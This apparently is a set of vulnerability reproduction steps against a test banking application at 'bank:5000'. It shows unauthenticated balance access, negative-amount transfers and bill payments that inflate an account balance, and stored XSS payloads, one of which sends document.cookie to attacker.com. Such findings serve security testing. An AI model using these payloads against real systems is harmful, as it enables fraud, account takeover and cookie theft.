1. GET http://bank:5000/check_balance/ADMIN001 (no Authorization header)
2. Response: {"account_number": "ADMIN001", "balance": 999902.0, "username": "admin", "status": "success"}
3. No authentication required to view any account balance

1. Login as regular user and get JWT token
2. POST http://bank:5000/transfer with body: {"to_account":"ADMIN001","amount":-100}
3. Response: {"message": "Transfer Completed", "new_balance": 1100.0}
4. Attacker balance increased by 100 instead of decreasing

1. Login as regular user and get JWT token
2. POST http://bank:5000/api/bill-payments/create with body: {"biller_id":1,"amount":-500,"payment_method":"balance","description":"neg"}
3. Response: {"status": "success", "payment_details": {"amount": -500.0}}
4. GET http://bank:5000/check_balance/5564867359 shows balance grew from 1100 to 501600

1. POST http://bank:5000/transfer with: {"to_account":"ADMIN001","amount":1,"description":"<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"}
2. GET http://bank:5000/transactions/ADMIN001 returns the transaction with the raw XSS payload in the description field
3. If the admin panel renders transaction descriptions without escaping, the script executes

1. POST http://bank:5000/api/bill-payments/create with: {"biller_id":1,"amount":10,"payment_method":"balance","description":"<script>alert(1)</script>"}
2. GET http://bank:5000/api/bill-payments/history returns: {"description": "<script>alert(1)</script>"}
